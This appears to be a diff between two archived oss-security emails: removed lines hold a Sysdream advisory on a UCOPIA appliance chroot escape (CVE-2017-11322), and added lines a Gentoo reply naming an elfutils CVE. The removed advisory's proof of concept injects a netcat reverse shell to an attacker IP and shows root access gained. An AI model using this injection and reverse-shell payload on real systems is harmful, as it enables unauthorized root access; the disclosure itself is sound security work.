@@ -1,97 +1,19 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/09/29/3
-Message-ID: <0495fde6-eee0-e1e3-a58d-dc3fe4dcebf1@sysdream.com>
-Date: Fri, 29 Sep 2017 15:02:24 +0200
-From: Sysdream Labs <labs@...dream.com>
-To: fulldisclosure@...lists.org
-Cc: oss-security@...ts.openwall.com
-Subject: [CVE-2017-11322] UCOPIA Wireless Appliance < 5.1.8 Privileges Escalation
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/03/22/2
+Message-ID: <12344565.ez7IU7Tgeu@blackgate>
+Date: Wed, 22 Mar 2017 11:16:35 +0100
+From: Agostino Sarubbo <ago@...too.org>
+To: oss-security@...ts.openwall.com
+Subject: Re: elfutils: memory allocation failure in allocate_elf (common.h)
 Content-Type: text/plain; charset=utf-8
 
-# [CVE-2017-11322] UCOPIA Wireless Appliance < 5.1.8 Privileges Escalation
+On Wednesday 09 November 2016 15:39:17 Agostino Sarubbo wrote:
+> Permalink:
+> https://blogs.gentoo.org/ago/2016/11/04/elfutils-memory-allocation-failure-i
+> n-allocate_elf-common-h
 
-## Asset description
-
-UCOPIA solutions bring together a combination of software, appliance and cloud services serving small to large customers.
-
-More than 12,000 UCOPIA solutions are deployed and maintained by UCOPIA expert partners all over the world.
-
-The affected asset in this report is a WiFi management appliance.
-
-## Vulnerability
-
-CHROOT escape and privileges escalation.
-
-**Threat**
-
-Improper sanitization of system commands in the chroothole_client executable in UCOPIA Wireless Appliance, prior to 5.1.8, allows local attackers to elevate privileges to root user and escape from the *chroot*.
-
-**CVE ID**: CVE-2017-11322
-
-**Access Vector**: local
-
-**Security Risk**: high
-
-**Vulnerability**: CWE-78
-
-**CVSS Base Score**: 8.2 (High)
-
-**CVSS Vector**: CVSS:3.0/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
-
-### Proof of Concept: chroot escape / privileges escalation
-
-The **chroothole_client** binary is used by the appliance to run programs outside the *chroot*, as the **root** user.
-
-Because of an improper sanitization of system commands, we managed to gain a complete **root** access to the appliance, outside the *chroot*.
-
-```
-$ chroothole_client '/usr/sbin/status'
-is not running ... failed !
-$ chroothole_client '/usr/sbin/status $(which nc)'
-/bin/nc is not running ... failed!
-$ chroothole_client '/usr/sbin/status $(nc 10.0.0.125 4444 -e /bin/sh)'
-```
-
-Attacker terminal :
-
-```
-$ ncat -lvp 4444
-Ncat: Listening on 0.0.0.0:4444
-Ncat: Connection from 10.0.0.1:49156.
-whoami
-root
-```
-
-## Solution
-
-Update to UCOPIA 5.1.8
-
-## Timeline (dd/mm/yyyy)
-
-* 08/03/2017 : Vulnerability discovery.
-* 03/05/2017 : Initial contact.
-* 10/05/2017 : GPG Key exchange.
-* 10/05/2017 : Advisory sent to vendor.
-* 17/05/2017 : Request for feedback.
-* 22/05/2017 : Vendor acknowledge the vulnerabilities.
-* 21/06/2017 : Sysdream Labs request for an ETA, warning for public disclosure.
-* 21/06/2017 : Vendor say that the UCOPIA 5.1.8 fixes the issue.
-* 29/09/2017 : Public disclosure.
-
-## Credits
-
-* Nicolas CHATELAIN, Sysdream (n.chatelain -at- sysdream -dot- com)
+This is CVE-2016-10254
 
 -- 
-SYSDREAM Labs <labs@...dream.com>
-
-GPG :
-47D1 E124 C43E F992 2A2E
-1551 8EB4 8CD9 D5B2 59A1
-
-* Website: https://sysdream.com/
-* Twitter: @sysdream
-
-
-
-Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
+Agostino Sarubbo
+Gentoo Linux Developer
